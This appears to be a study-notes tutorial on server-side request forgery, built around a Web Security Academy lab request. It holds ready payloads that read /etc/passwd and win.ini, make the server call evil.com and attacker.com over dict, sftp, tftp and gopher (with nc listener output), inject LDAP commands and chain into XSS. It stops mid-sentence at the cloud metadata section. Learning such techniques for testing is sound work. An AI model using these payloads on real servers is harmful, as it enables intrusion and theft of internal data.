## SSRF(Server-side request forgery)

  Server-side request forgery (also known as SSRF) is a web security vulnerability 
  that allows an attacker to induce the server-side application to make requests to an unintended location. 
  
  In a typical SSRF attack, the attacker might cause the server to make a connection to internal-only services within the organization's infrastructure.
  In other cases, they may be able to force the server to connect to arbitrary external systems,potentially 
  leaking sensitive data such as authorization credentials. 


 ## How To Find SSRF 
 
  First check the all url rquest in burp proxy, and observe that request,find 2 urls first url sand request to server and secand url sand request to
  server and server call to secand server request, here is posible SSRF vulnerability 
 
  
## EX:

 1. In a simple way - Attacker asks the server to fetch a URL for him

        GET /?url=http://google.com/ HTTP/1.1
        Host: example.com
        
 Here example.com fetch http://google.com from its server, here posible SSRF vulnerability
 
 2. Here cheack a stock check products 

        POST /product/stock HTTP/1.1
        Host: 0a6800110358b1bfc093443000f600a4.web-security-academy.net
        Cookie: session=mewjzSnDMV8c3uT7hIo493arKt9OuuH9
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
        Accept: */*
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate
        Referer: https://0a6800110358b1bfc093443000f600a4.web-security-academy.net/product?productId=1
        Content-Type: application/x-www-form-urlencoded
        Origin: https://0a6800110358b1bfc093443000f600a4.web-security-academy.net
        Content-Length: 107
        Sec-Fetch-Dest: empty
        Sec-Fetch-Mode: cors
        Sec-Fetch-Site: same-origin
        Te: trailers
        Connection: close

       stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
    
    
 ## First url in request Host url
 
    Host: 0a6800110358b1bfc093443000f600a4.web-security-academy.net
    
## Secand Url in request StockApi 

    stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
    
 stockapi is request is another server call, here is posible SSRF vulnerability
     
    
 ## Types of SSRF -
 
   Two Type of SSRF 
   
   i. The one which displays response to attacker ( Basic )
   
   ii. The one which does not display response ( Blind )
   
   
## What can we do with SSRF? -

   SSRF to Reflected XSS
   
   Try URL schemas to read internal and make server perform actions (file:///, dict://, ftp://, gopher://..)
   
   We can scan for internal networks and ports
   
   If it runs on Cloud Instances try to fetch META-DATA
   
 ## SSRF to Reflected XSS -
 
  Simply fetch a file from external sites which has malicious payload with content type served as html
  
  Example -
  
    http://localhost:4567/?url=http://brutelogic.com.br/poc.svg
  
 ## Testing URL schemas -
 
   First thing to do when we find an SSRF is to test all the wrapper which are working
   
    file:///
    dict://
    sftp://
    ldap://
    tftp://
    gopher://
    
    
## file:// -
 
   File is used to fetch file from the file system
   
    http://example.com/ssrf.php?url=file:///etc/passwd
    http://example.com/ssrf.php?url=file:///C:/Windows/win.ini
    
 If the server block http request to external sites or whitelist you could simply use below URL schemas to make a request
 
 ## dict:// -
 
  DICT URL scheme is used to refer to definitions or word lists available using the DICT protocol:
  
    http://example.com/ssrf.php?dict://evil.com:1337/

    evil.com:$ nc -lvp 1337
    Connection from [192.168.0.12] port 1337 [tcp/*] accepted (family 2, sport 31126)
    CLIENT libcurl 7.40.0
  
 ## sftp:// -
 
 Sftp stands for SSH File Transfer Protocol, or Secure File Transfer Protocol,
 is a separate protocol packaged with SSH that works in a similar way over a secure connection.
 
     http://example.com/ssrf.php?url=sftp://evil.com:1337/

     evil.com:$ nc -lvp 1337
     Connection from [192.168.0.12] port 1337 [tcp/*] accepted (family 2, sport 37146)
     SSH-2.0-libssh2_1.4.2
  
  
## ldap:// or ldaps:// or ldapi:// -

LDAP stands for Lightweight Directory Access Protocol.
It is an application protocol used over an IP network to manage and access the distributed directory information service.

    http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquit
    http://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquit
    http://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit
  
 ## tftp:// -
 
 Trivial File Transfer Protocol is a simple lockstep File Transfer Protocol which allows a client to get a file from or put a file onto a remote host
 
    http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET

    evil.com:# nc -lvup 1337
    Listening on [0.0.0.0] (family 0, port 1337)
    TESTUDPPACKEToctettsize0blksize512timeout3
    
 ## gopher:// -
 
   Gopher, is a distributed document delivery service. It allows users to explore, 
   search and retrieve information residing on different locations in a seamless fashion
   
    http://example.com/ssrf.php?url=http://attacker.com/gopher.phpgopher.php (host it on acttacker.com):-
    <?php
    header('Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest');
    ?>

    evil.com:# nc -lvp 1337
    Listening on [0.0.0.0] (family 0, port 1337)
    Connection from [192.168.0.12] port 1337 [tcp/*] accepted (family 2, sport 49398) 
    Hi
    ssrf
    test
    
 ## Cloud Instances -
  
  Amazon:
  
  If you find an SSRF in Amazon Could, Amazon expose an internal service every EC2 instance can query for instance metadata about the host.
  If you found an SSRF vulnerability that runs on EC2, try requesting :
